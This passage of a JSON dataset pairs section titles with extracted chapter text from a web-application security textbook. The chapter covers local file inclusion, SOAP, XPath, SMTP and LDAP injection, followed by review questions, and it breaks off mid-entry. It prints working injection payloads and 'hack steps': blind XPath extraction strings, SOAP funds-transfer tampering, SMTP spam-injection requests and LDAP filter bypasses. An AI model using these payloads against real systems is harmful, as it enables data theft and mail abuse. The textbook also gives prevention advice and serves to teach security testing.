execution attacks.\nLocal file inclusion vulnerabilities can potentially exist in a much wider range\nof scripting environments than those that support remote file inclusion. To test\nfor local file inclusion vulnerabilities, perform the following steps:\n■ Submit the name of a known executable resource on the server, and\ndetermine whether there is any change in the application’s behavior.\n■ Submit the name of a known static resource on the server, and determine\nwhether its contents are copied into the application’s response.\n■ If the application is vulnerable to local file inclusion, attempt to access\nany sensitive functionality or resources that you cannot reach directly via\nthe web server.\nPreventing Script Injection Vulnerabilities\nIn general, the best way to avoid script injection vulnerabilities is to not pass\nuser-supplied input, or data derived from it, into any dynamic execution or\ninclude functions. If this is considered to be unavoidable for some reason, then\nthe relevant input should be strictly validated to prevent any attack occurring.\nIf possible, use a white list of known good values (such as a list of all the lan-\nguages or locations supported by the application), and reject any input that\ndoes not appear on this list. Failing that, check the characters used within the\ninput against a set known to be harmless, such as alphanumeric characters\nexcluding whitespace."
  },
  {
    "input": "Injecting into SOAP",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 313\nChapter 9 ■ Injecting Code 313\nInjecting into SOAP\nThe Simple Object Access Protocol (SOAP) is a message-based communica-\ntions technology that uses the XML format to encapsulate data. It can be used\nto share information and transmit messages between systems, even if these\nrun on different operating systems and architectures. Its primary use is in web\nservices, and in the context of a browser-accessed web application, you are\nmost likely to encounter SOAP in the communications that occur between\nback-end application components.\nSOAP is often used in large-scale enterprise applications where individual\ntasks are performed by different computers to improve performance. It is also\noften found where a web application has been deployed as a front end to an\nexisting application. In this situation, communications between different\ncomponents may be implemented using SOAP to ensure modularity and\ninteroperability.\nBecause XML is an interpreted language, SOAP is potentially vulnerable to\ncode injection in a similar way as the other examples already described. XML\nelements are represented syntactically, using the metacharacters < >and /. If\nuser-supplied data containing these characters is inserted directly into a SOAP\nmessage, an attacker may be able to interfere with the structure of the message\nand so interfere with the application’s logic or cause other undesirable effects.\nConsider a banking application in which a user initiates a funds transfer\nusing an HTTP request like the following:\nPOST /transfer.asp HTTP/1.0\nHost: wahh-bank.com\nContent-Length: 65\nFromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit\nIn the course of processing this request, the following SOAP message is sent\nbetween two of the application’s back-end components:\n<soap:Envelope xmlns:soap=”http://www.w3.org/2001/12/soap-envelope”>\n<soap:Body>\n<pre:Add xmlns:pre=http://target/lists soap:encodingStyle=\n”http://www.w3.org/2001/12/soap-encoding”>\n<Account>\n<FromAccount>18281008</FromAccount>\n<Amount>1430</Amount>\n<ClearedFunds>False</ClearedFunds>\n<ToAccount>08447656</ToAccount>\n</Account>\n</pre:Add>\n</soap:Body>\n</soap:Envelope>\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 314\n314 Chapter 9 ■ Injecting Code\nNote how the XML elements in the message correspond to the parameters in\nthe HTTP request, and also the addition of the ClearedFundselement. At this\npoint in the application’s logic, it has determined that there are insufficient\nfunds available to perform the requested transfer, and has set the value of this\nelement to False, with the result that the component which receives the SOAP\nmessage does not act upon it.\nIn this situation, there are various ways in which you could seek to inject\ninto the SOAP message, and so interfere with the application’s logic. For exam-\nple, submitting the following request will cause an additional ClearedFunds\nelement to be inserted into the message before the original element (while pre-\nserving the SQL’s syntactic validity). If the application processes the first\nClearedFundselement that it encounters, then you may succeed in performing\na transfer when no funds are available:\nPOST /transfer.asp HTTP/1.0\nHost: wahh-bank.com\nContent-Length: 119\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit\nIf, on the other hand, the application processes the last ClearedFunds ele-\nment that it encounters, you could inject a similar attack into the ToAccount\nparameter.\nA different type of attack would be to use XML comments to remove part of\nthe original SOAP message altogether, and replace the removed elements with\nyour own. For example, the following request injects a ClearedFundselement\nvia the Amountparameter, provides the opening tag for the ToAccountelement,\nopens a comment, and closes the comment in the ToAccount parameter, thus\npreserving the syntactic validity of the XML:\nPOST /transfer.asp HTTP/1.0\nHost: wahh-bank.com\nContent-Length: 125\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit\nA further type of attack would be to attempt to complete the entire SOAP\nmessage from within an injected parameter and comment out the remainder of\nthe message. However, because the opening comment will not be matched by\na closing comment, this attack produces strictly invalid XML, which will be\nrejected by many XML parsers:\nPOST /transfer.asp HTTP/1.0\nHost: wahh-bank.com\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 315\nChapter 9 ■ Injecting Code 315\nContent-Length: 176\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFund\ns><ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body></soap:\nEnvelope><!--&Submit=Submit\nFinding and Exploiting SOAP Injection\nSOAP injection can be difficult to detect, because supplying XML metacharac-\nters in a noncrafted way will break the format of the SOAP message, and this\nwill often simply result in an uninformative error message. Nevertheless, the\nfollowing steps can be used to detect SOAP injection vulnerabilities with a\ndegree of reliability.\nHACK STEPS\n■ Submit a rogue XML closing tag such as </foo>in each parameter in\nturn. If no error occurs, your input is probably not being inserted into a\nSOAP message, or is being sanitized in some way.\n■ If an error was received, submit instead a valid opening and closing tag\npair, such as <foo></foo>. If this causes the error to disappear, then the\napplication may well be vulnerable.\n■ In some situations, data that is inserted into an XML-formatted message\nis subsequently read back from its XML form and returned to the user. If\nthe item you are modifying is being returned in the application’s\nresponses, see whether any XML content you submit is returned in its\nidentical form, or has been normalized in some way. Submit the follow-\ning two values in turn:\ntest<foo/>\ntest<foo></foo>\nIf you find that either item is returned as the other, or simply as test, then\nyou can be confident that your input is being inserted into an XML-based\nmessage.\n■ If the HTTP request contains several parameters which may be being\nplaced into a SOAP message, try inserting the opening comment charac-\nter <!--into one parameter and the closing comment character !-->\ninto another parameter. Then, switch these around (because you have no\nway of knowing which order the parameters appear in). This can have the\neffect of commenting out a portion of the server’s SOAP message, which\nmay cause a change in the application’s logic, or result in a different\nerror condition which may divulge information."
  },
  {
    "input": "Injecting into XPath",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 316\n316 Chapter 9 ■ Injecting Code\nIf SOAP injection is difficult to detect, then it can be even harder to exploit.\nIn most situations, you will need to know the structure of the XML that sur-\nrounds your data, in order to supply crafted input which modifies the message\nwithout invalidating it. In all of the preceding tests, look for any error mes-\nsages that reveal any details about the SOAP message being processed. If you\nare lucky, a verbose message will disclose the entire message, enabling you to\nconstruct crafted values to exploit the vulnerability. If you are unlucky, you\nmay be restricted to pure guesswork, which is very unlikely to be successful.\nPreventing SOAP Injection\nSOAP injection can be prevented by employing boundary validation filters at\nany point where user-supplied data is inserted into a SOAP message (see\nChapter 2). This should be performed both on data that has been immediately\nreceived from the user in the current request and on any data which has been\npersisted from earlier requests or generated from other processing that takes\nuser data as input.\nTo prevent the attacks described, the application should HTML-encode any\nXML metacharacters appearing in user input. HTML-encoding involves\nreplacing literal characters with their corresponding HTML entities. This\nensures that the XML interpreter will treat them as part of the data value of the\nrelevant element, and not as part of the structure of the message itself. The\nHTML-encodings of some common problematic characters are:\n< &lt;\n> &gt;\n/ &#47;\nInjecting into XPath\nThe XML Path Language (or XPath) is an interpreted language used for navi-\ngating around XML documents, and for retrieving data from within them. In\nmost cases, an XPath expression represents a sequence of steps that is required\nto navigate from one node of a document to another.\nWhere web applications store data within XML documents, they may use\nXPath to access the data in response to user-supplied input. If this input is\ninserted into the XPath query without any filtering or sanitization, then an\nattacker may be able to manipulate the query to interfere with the applica-\ntion’s logic or retrieve data for which she is not authorized.\nXML documents are not generally a preferred vehicle for storing enterprise\ndata. However, they are frequently used to store application configuration\ndata that may be retrieved on the basis of user input. They may also be used by\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 317\nChapter 9 ■ Injecting Code 317\nsmaller applications to persist simple information such as user credentials,\nroles, and privileges.\nConsider the following XML data store:\n<addressBook>\n<address>\n<firstName>William</firstName>\n<surname>Gates</surname>\n<password>MSRocks!</password>\n<email>billyg@microsoft.com</email>\n<ccard>5130 8190 3282 3515</ccard>\n</address>\n<address>\n<firstName>Chris</firstName>\n<surname>Dawes</surname>\n<password>secret</password>\n<email>cdawes@craftnet.de</email>\n<ccard>3981 2491 3242 3121</ccard>\n</address>\n<address>\n<firstName>James</firstName>\n<surname>Hunter</surname>\n<password>letmein</password>\n<email>james.hunter@pookmail.com</email>\n<ccard>8113 5320 8014 3313</ccard>\n</address>\n</addressBook>\nAn XPath query to retrieve all email addresses would look like the following:\n//address/email/text()\nA query to return all of the details of the user Dawes would be:\n//address[surname/text()=’Dawes’]\nIn some applications, user-supplied data may be embedded directly into\nXPath queries, and the results of the query may be returned in the applica-\ntion’s response or used to determine some aspect of the application’s behavior.\nSubverting Application Logic\nConsider an application function that retrieves a user’s stored credit card\nnumber based on a username and password. The following XPath query effec-\ntively verifies the user-supplied credentials and retrieves the relevant user’s\ncredit card number:\n//address[surname/text()=’Dawes’ and password/text()=’secret’]/ccard/\ntext()\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 318\n318 Chapter 9 ■ Injecting Code\nIn this case, an attacker may be able to subvert the application’s query in an\nidentical way to a SQL injection flaw. For example, supplying a password with\nthe value\n‘ or ‘a’=’a\nwill result in the following XPath query, which will retrieve the credit card\ndetails of all users:\n//address[surname/text()=’Dawes’ and password/text()=’‘ or ‘a’=’a’]/\nccard/text()\nNOTE\n■■ As with SQL injection, single quotation marks are not required when\ninjecting into a numeric value.\n■■ Unlike SQL queries, keywords in XPath queries are case sensitive, as\nare the element names in the XML document itself.\nInformed XPath Injection\nXPath injection flaws can be exploited to retrieve arbitrary information from\nwithin the target XML document. One reliable way of doing this uses the same\ntechnique as was described for SQL injection, of causing the application to\nrespond in different ways contingent upon a condition specified by the\nattacker.\nSubmitting the following two passwords will result in different behavior by\nthe application—results will be returned in the first case but not in the second:\n‘ or 1=1 and ‘a’=’a\n‘ or 1=2 and ‘a’=’a\nThis difference in behavior can be leveraged to test the truth of any specified\ncondition and, therefore, extract arbitrary information one byte at a time. As\nwith SQL, the XPath language contains a substring function, which can be\nused to test the value of a string one character at a time. For example, supply-\ning the password\n‘ or //address[surname/text()=’Gates’ and substring(password/\ntext(),1,1)=’M’] and ‘a’=’a\nwill result in the following XPath query, which will return results if the first\ncharacter of the Gates user’s password is M:\n//address[surname/text()=’Dawes’ and password/text()=’‘ or\n//address[surname/text()=’Gates’ and substring(password/text(),1,1)=’M’]\nand ‘a’=’a’]/ccard/text()\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 319\nChapter 9 ■ Injecting Code 319\nBy cycling through each character position, and testing each possible value,\nan attacker can extract the full value of Gates’s password.\nBlind XPath Injection\nIn the attack just described, the injected test condition specified both the\nabsolute path to the extracted data (address) and the names of the targeted\nfields (surname and password). In fact, it is possible to mount a fully blind\nattack without possessing this information. XPath queries can contain steps\nthat are relative to the current node within the XML document, so from the\ncurrent node it is possible to navigate to the parent node or to a specific child\nnode. Further, XPath contains functions to query meta-information about the\ndocument, including the name of a specific element. Using these techniques, it\nis possible to extract the names and values of all nodes within the document\nwithout knowing any prior information about its structure or contents.\nFor example, you can use the substring technique described previously to\nextract the name of the current node’s parent, by supplying a series of pass-\nwords of the form:\n‘ or substring(name(parent::*[position()=1]),1,1)=’a\nThis input generates results, because the first letter of the addressnode is a.\nMoving on to the second letter, you can confirm that this is dby supplying the\nfollowing passwords, the last of which generates results:\n‘ or substring(name(parent::*[position()=1]),2,1)=’a\n‘ or substring(name(parent::*[position()=1]),2,1)=’b\n‘ or substring(name(parent::*[position()=1]),2,1)=’c\n‘ or substring(name(parent::*[position()=1]),2,1)=’d\nHaving established the name of the address node, you can then cycle\nthrough each of its child nodes, extracting all of their names and values. Spec-\nifying the relevant child node by index avoids the need to know the names of\nany nodes. For example, the following query will return the value Hunter:\n//address[position()=3]/child::node()[position()=4]/text()\nAnd the following query will return the value letmein:\n//address[position()=3]/child::node()[position()=6]/text()\nThis technique can be used in a completely blind attack, where no results are\nreturned within the application’s responses, by crafting an injected condition\nthat specifies the target node by index. For example, supplying the following\npassword will return results if the first character of Gates’s password is M:\n‘ or substring(//address[position()=1]/child::node()[position()=6]/\ntext(),1,1)=’M’ and ‘a’=’a\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 320\n320 Chapter 9 ■ Injecting Code\nBy cycling through every child node of every address node, and extracting\ntheir values one character at a time, you can extract the entire contents of the\nXML data store.\nTIP XPath contains two useful functions that can help you automate the\nabove attack and quickly iterate through all nodes and data in the XML\ndocument:\n■■ count()—This returns the number of child nodes of a given element,\nwhich can be used to determine the range of position()values to\niterate over.\n■■ string-length()—This returns the length of a supplied string,\nwhich can be used to determine the range of substring()values to\niterate over.\nFinding XPath Injection Flaws\nMany of the attack strings that are commonly used to probe for SQL injection\nflaws will typically result in anomalous behavior when submitted to a func-\ntion that is vulnerable to XPath injection. For example, either of the following\ntwo strings will normally invalidate the XPath query syntax and so generate\nan error:\n‘\n‘--\nOne or more of the following strings will typically result in some change in\nthe application’s behavior without causing an error, in the same way as they\ndo in relation to SQL injection flaws:\n‘ or ‘a’=’a\n‘ and ‘a’=’b\nor 1=1\nand 1=2\nHence, in any situation where your tests for SQL injection provide tentative\nevidence for a vulnerability, but you are unable to conclusively exploit the\nflaw, you should investigate the possibility that you are dealing with an XPath\ninjection flaw."
  },
  {
    "input": "Injecting into SMTP",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 321\nChapter 9 ■ Injecting Code 321\nHACK STEPS\n■ Try submitting the following values, and determine whether these result\nin different application behavior, without causing an error:\n‘ or count(parent::*[position()=1])=0 or ‘a’=’b\n‘ or count(parent::*[position()=1])>0 or ‘a’=’b\n■ If the parameter is numeric, also try the following test strings:\n1 or count(parent::*[position()=1])=0\n1 or count(parent::*[position()=1])>0\n■ If any of the precedingstrings causes differential behavior within the\napplication without causing an error, it is likely that you can extract arbi-\ntrary data by crafting test conditions to extract one byte of information at\na time. Use a series of conditions with the following form to determine\nthe name of the current node’s parent:\nsubstring(name(parent::*[position()=1]),1,1)=’a’\n■ Having extracted the name of the parent node, use a series of conditions\nwith the following form to extract all of the data within the XML tree:\nsubstring(//parentnodename[position()=1]/child::node()\n[position()=1]/text(),1,1)=’a’\nPreventing XPath Injection\nIf it is felt necessary to insert user-supplied input into an XPath query, this\noperation should only be performed on simple items of data which can be sub-\njected to strict input validation. The user input should be checked against a\nwhite list of acceptable characters, which should ideally include only alphanu-\nmeric characters. Characters that may be used to interfere with the XPath\nquery should be blocked, including ( ) = ‘ [ ] : , * /and all whitespace.\nAny input that does not match the white list should be rejected, not sanitized.\nInjecting into SMTP\nMany applications contain a facility for users to submit messages via the appli-\ncation; for example, to report a problem to support personnel or provide feed-\nback about the web site. This facility is usually implemented by interfacing with\na mail (or SMTP) server. Typically, user-supplied input will be inserted into the\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 322\n322 Chapter 9 ■ Injecting Code\nSMTP conversation that the application server conducts with the mail server. If\nan attacker can submit suitable crafted input that is not filtered or sanitized, he\nmay be able to inject arbitrary STMP commands into this conversation.\nIn most cases, the application will enable you to specify the contents of the\nmessage and your own email address (which is inserted into the From field of\nthe resulting email). You may also be able to specify the subject of the message\nand other details. Any relevant field that you control may be vulnerable to\nSMTP injection.\nSMTP injection vulnerabilities are often exploited by spammers who scan\nthe Internet for vulnerable mail forms and use these to generate large volumes\nof nuisance email.\nEmail Header Manipulation\nConsider the form shown in Figure 9-7, which allows users to send feedback\nabout the application.\nFigure9-7: A typical site feedback form\nHere, users can specify a From address and the contents of the message. The\napplication passes this input to the PHP mail() command, which constructs\nthe email and performs the necessary SMTP conversation with its configured\nmail server. The mail generated is as follows:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nSubject: Site problem\nConfirm Order page doesn’t load\nThe PHP mail() command uses an additional_headers parameter to set\nthe From address for the message. This parameter is also used to specify other\nheaders, including Cc and Bcc, by separating each required header with a\nnewline character. Hence, an attacker can cause the message to be sent to arbi-\ntrary recipients by injecting one of these headers into the From field, as illus-\ntrated in Figure9-8.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 323\nChapter 9 ■ Injecting Code 323\nFigure9-8: An email header injection attack\nThis causes the mail()command to generate the following message:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nBcc: all@wahh-othercompany.com\nSubject: Site problem\nConfirm Order page doesn’t load\nSMTP Command Injection\nIn other cases, the application may perform the SMTP conversation itself, or\nmay pass user-supplied input to a different component in order to do this. In\nthis situation, it may be possible to inject arbitrary SMTP commands directly\ninto this conversation, potentially taking full control of the messages being\ngenerated by the application.\nFor example, consider an application that uses requests of the following\nform to submit site feedback:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 56\nFrom=daf@wahh-mail.com&Subject=Site+feedback&Message=foo\nThis causes the web application to perform an SMTP conversation with the\nfollowing commands:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site feedback\nfoo\n.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 324\n324 Chapter 9 ■ Injecting Code\nNOTE After the SMTP client issues the DATAcommand, it sends the contents\nof the email message, comprising the message headers and body, and then\nsends a single dot character on its own line. This tells the server that the\nmessage is complete, and the client can then issue further SMTP commands, to\nsend further messages.\nIn this situation, you may be able to inject arbitrary SMTP commands into\nany of the email fields that you control. For example, you can attempt to inject\ninto the Subject field as follows:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 266\nFrom=daf@wahh-mail.com&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d\n%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail\n.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail\n.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo\nIf the application is vulnerable, then this will result in the following SMTP\nconversation, which generates two different email messages, with the second\nbeing entirely within your control:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site+feedback\nfoo\n.\nMAIL FROM: mail@wahh-viagra.com\nRCPT TO: john@wahh-mail.com\nDATA\nFrom: mail@wahh-viagra.com\nTo: john@wahh-mail.com\nSubject: Cheap V1AGR4\nBlah\n.\nfoo\n.\nFinding SMTP Injection Flaws\nTo probe an application’s mail functionality effectively, you need to target\nevery parameter that is submitted to an email-related function, even those that\nmay initially appear to be unrelated to the content of the generated message.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 325\nChapter 9 ■ Injecting Code 325\nYou should also test for each kind of attack, and you should perform each test\ncase using both Windows and Unix-style newline characters.\nHACK STEPS\n■ You should submit each of the following test strings as each parameter in\nturn, inserting your own email address at the relevant position:\n<youremail>%0aCc:<youremail>\n<youremail>%0d%0aCc:<youremail>\n<youremail>%0aBcc:<youremail>\n<youremail>%0d%0aBcc:<youremail>\n%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y\nouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS\nubject:+test%0afoo%0a%2e%0a\n%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0\nd%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%\n0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0\nafoo%0d%0a%2e%0d%0a\n■ Note any error messages returned by the application. If these appear to\nrelate to any problem in the email function, investigate whether you\nneed to fine-tune your input to exploit a vulnerability.\n■ The application’s responses may not indicate in any way whether a vul-\nnerability exists or was successfully exploited. You should monitor the\nemail address you specified to see if any mails are received.\n■ Review closely the HTML form that generates the relevant request. This\nmay contain clues regarding the server-side software being used. It may\nalso contain a hidden or disabled field that is used specify the To address\nof the email, which you can modify directly.\nTIP Functions to send emails to application support personnel are frequently\nregarded as peripheral and may not be subject to the same security standards\nor testing as the main application functionality. Also, because they involve\ninterfacing to an unusual back-end component, they are often implemented via\na direct call to the relevant operating system command. Hence, in addition to\nprobing for SMTP injection, you should also review all email-related\nfunctionality very closely for OS command injection flaws."
  },
  {
    "input": "Injecting into LDAP",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 326\n326 Chapter 9 ■ Injecting Code\nPreventing SMTP Injection\nSMTP injection vulnerabilities can usually be prevented by implementing rig-\norous validation of any user-supplied data that is passed to an email function\nor used in an SMTP conversation. Each item should be validated as strictly as\npossible given the purpose for which it is being used:\n■■ Email addresses should be checked against a suitable regular expres-\nsion (which should of course reject any newline characters).\n■■ The message subject should not contain any newline characters, and\nmay be subjected to a suitable length limit.\n■■ If the contents of a message are being used directly in an SMTP conver-\nsation, then lines containing just a single dot should be disallowed.\nInjecting into LDAP\nThe Lightweight Directory Access Protocol (LDAP) is used for accessing direc-\ntory services over a network. A directory is a hierarchically organized data\nstore that may contain any kind of information but is commonly used to store\npersonal data such as names, telephone numbers, email addresses, and job\nfunctions. An example of such a directory is the Active Directory used within\nWindows domains. You are most likely to encounter LDAP being used in cor-\nporate intranet-based web applications, such as an HR application that allows\nusers to view and modify information about employees.\nConsider a simple application function that enables users to search\nfor employee contact details by specifying an employee name, as shown in\nFigure9-9.\nFigure9-9: An LDAP-based directory search function\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 327\nChapter 9 ■ Injecting Code 327\nWhen a user supplies the search term GUILL, the application performs the\nfollowing LDAP query:\n<LDAP://ldapserver>;(givenName=GUILL);cn,telephoneNumber,department\nThis query contains two key elements:\n■■ The search filter:givenName=GUILL\n■■ The attributes to be returned:cn,telephoneNumber,department\nIn this situation, it is possible for an attacker to supply a crafted search term\nthat interferes with one or both of these elements, to modify the information\nreturned by the query.\nInjecting Query Attributes\nTo retrieve other attributes in the query’s results, you must first terminate the\nbrackets that encapsulate the search filter and then specify the additional\nattributes that you desire. For example, supplying\nGUILL);mail,cn;\nresults in the query\n<LDAP://ldapserver>;(givenName=GUILL);mail,cn;);cn,telephoneNumber,\ndepartment\nwhich returns an additional column containing the user’s email address, as\nshown in Figure9-10.\nFigure9-10: Injecting an additional query attribute\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 328\n328 Chapter 9 ■ Injecting Code\nNote the additional column containing the bogus attribute name cn;);cn.\nThe LDAP query attributes are specified in a comma-delimited list, so every-\nthing between the first and second comma is treated as an attribute name.\nNote also that Active Directory will return an error if a completely arbitrary\nattribute name is specified; however, it tolerates invalid names that start with\nan actually valid name followed by a semicolon, hence the need to specify cn;\nafter the injected string.\nGoing further, you can specify any number of fields to be returned in the\nresults, and you can also specify an asterisk as the main search filter, which\nfunctions as a wildcard. For example, supplying\n*);cn,l,co,st,c,mail,cn;\nwill return all of these fields for every user, as shown in Figure9-11.\nFigure9-11: An attack to retrieve all information in the directory\nModifying the Search Filter\nIn some situations, the user-supplied input is not used directly as the entire\nvalue of the search filter but is embedded in a more complex filter. For exam-\nple, if the user performing the search is only allowed to view the details of\nemployees based in France, the application might perform the following\nquery:\n<LDAP://ldapserver>;(&(givenName=GUILL)(c=FR));cn,telephoneNumber,depart\nment,c\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 329\nChapter 9 ■ Injecting Code 329\nThis uses the &operator to combine two conditions—the first controlled by\nthe user and the second preset by the application. Supplying the search term *\nwill return the details of all users based in France. However, supplying the\nstring\n*));cn,cn;\ncauses the application to make the following query:\n<LDAP://ldapserver>;(&(givenName=*));cn,cn;)(c=FR));cn,telephoneNumber,d\nepartment,c\nwhich subverts the application’s original logic, removing the (c=FR)condition\nfrom the search filter, thus returning the results of all users in all countries, as\nshown in Figure9-12.\nFigure9-12: A successful attack to subvert the intended search filter\nFinding LDAP Injection Flaws\nSupplying invalid input to an LDAP operation typically does not result in any\ninformative error message. In general, the evidence available to you in diag-\nnosing a vulnerability includes the results returned by a search function, and\nthe occurrence of an error such as an HTTP 500 status code. Nevertheless, you\ncan use the following steps to identify an LDAP injection flaw with a degree of\nreliability.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 330\n330 Chapter 9 ■ Injecting Code\nHACK STEPS\n■ Try entering just the *character as a search term. This character functions\nas a wildcard in LDAP, but not in SQL. If a large number of results are\nreturned, this is a good indicator that you are dealing with an LDAP\nquery.\n■ Try entering a number of closing brackets:\n))))))))))\nThis input will close any brackets enclosing your input, and those that\nencapsulate the main search filter itself, resulting in unmatched closing\nbrackets, thus invalidating the query syntax. If an error results, the\napplication may well be vulnerable to LDAP injection. (Note that this input\nmay also break many other kinds of application logic, so this only provides\na strong indicator if you are already confident that you are dealing with an\nLDAP query.)\n■ Try entering a series of expressions like the following, until no error\noccurs, thus establishing the number of brackets you need to close to\ncontrol the rest of the query:\n*);cn;\n*));cn;\n*)));cn;\n*))));cn;\n■ Try adding extra attributes to the end of your input, using commas to\nseparate each item. Test each attribute in turn—an error message indi-\ncates that the attribute is not valid in the present context. Attributes\ncommonly used in directories queried by LDAP include:\ncn,c,mail,givenname,o,ou,dc,l,uid,objectclass,postaladdress,dn,sn\nPreventing LDAP Injection\nIf it is necessary to insert user-supplied input into an LDAP query, this opera-\ntion should only be performed on simple items of data that can be subjected to\nstrict input validation. The user input should be checked against a white list of\nacceptable characters, which should ideally include only alphanumeric char-\nacters. Characters that may be used to interfere with the LDAP query should\nbe blocked, including ( ) ; , * | &and =. Any input that does not match the\nwhite list should be rejected, not sanitized."
  },
  {
    "input": "Questions",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 331\nChapter 9 ■ Injecting Code 331\nChapter Summary\nWe have examined a wide range of code injection vulnerabilities, and the prac-\ntical steps that you can take to identify and exploit each one. There are many\nreal-world injection flaws that can be discovered within the first few seconds\nof interacting with an application—for example, by entering an apostrophe\ninto a search box. In other cases, code injection vulnerabilities may be highly\nsubtle, manifesting themselves in scarcely detectable differences in the appli-\ncation’s behavior, or reachable only through a multistage process of submit-\nting and manipulating crafted input.\nTo be confident that you have uncovered the code injection flaws that exist\nwithin an application, you need to be both thorough and patient. Practically\nevery type of injection can manifest itself in the processing of practically any\nitem of user-supplied data, including the names and values of query string\nparameters, POSTdata and cookies, and other HTTP headers. In many cases, a\ndefect will emerge only after extensive probing of the relevant parameter, as\nyou learn exactly what type of processing is being performed on your input\nand scrutinize the obstacles that stand in your way.\nFaced with the huge potential attack surface presented by code injection vul-\nnerabilities, you may feel that any serious assault on an application must entail a\ntitanic effort. However, part of learning the art of attacking software is to acquire\na sixth sense for where the treasure is hidden and how your target is likely to\nopen up so that you can steal it. The only way to gain this sense is through prac-\ntice, rehearsing the techniques we have described against the real-life applica-\ntions you encounter, and seeing how they stand up to them.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. You are trying to exploit a SQL injection flaw by performing a UNION\nattack to retrieve data. You do not know how many columns the origi-\nnal query returns. How can you find this out?\n2. You have located a SQL injection vulnerability in a string parameter.\nYou believe the database is either MS-SQL or Oracle but are unable at\nthis stage to retrieve any data or an error message to confirm which\ndatabase is running. How can you find this out?\n3. You have submitted a single quotation mark at numerous locations\nthroughout the application, and from the resulting error messages have\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 332\n332 Chapter 9 ■ Injecting Code\ndiagnosed several potential SQL injection flaws. Which one of the fol-\nlowing would be the safest location to test whether more crafted input\nhas an effect on the application’s processing?\n(a) Registering a new user\n(b) Updating your personal details\n(c) Unsubscribing from the service\n4. You have found a SQL injection vulnerability in a login function, and\nyou try to use the input ‘ or 1=1--to bypass the login. Your attack\nfails and the resulting error message indicates that the --characters are\nbeing stripped by the application’s input filters. How could you cir-\ncumvent this problem?\n5. You have found a SQL injection vulnerability but have been unable to\ncarry out any useful attacks because the application rejects any input\ncontaining whitespace. How can you work around this restriction?\n6. The application is doubling up all single quotation marks within user\ninput before these are incorporated into SQL queries. You have found a\nSQL injection vulnerability in a numeric field, but you need to use a\nstring value in one of your attack payloads. How can you place a string\ninto your query without using any quotation marks?\n7. In some rare situations, applications construct dynamic SQL queries out\nof user-supplied input in a way that cannot be made safe using parame-\nterized queries. When does this occur?\n8. You have escalated privileges within an application such that you now\nhave full administrative access. You discover a SQL injection vulnera-\nbility within a user administration function. How can you leverage this\nvulnerability to further advance your attack?\n9. You are attacking an application that holds no sensitive data, and con-\ntains no authentication or access control mechanisms. In this situation,\nhow should you rank the significance of the following vulnerabilities?\n(a) SQL injection\n(b) XPath injection\n(c) OS command injection\n10. You are probing an application function that enables you to search per-\nsonnel details. You suspect that the function is accessing either a data-\nbase or an Active Directory back end. How could you try to determine\nwhich of these is the case?"
  },
  {
    "input": "Common Vulnerabilities",
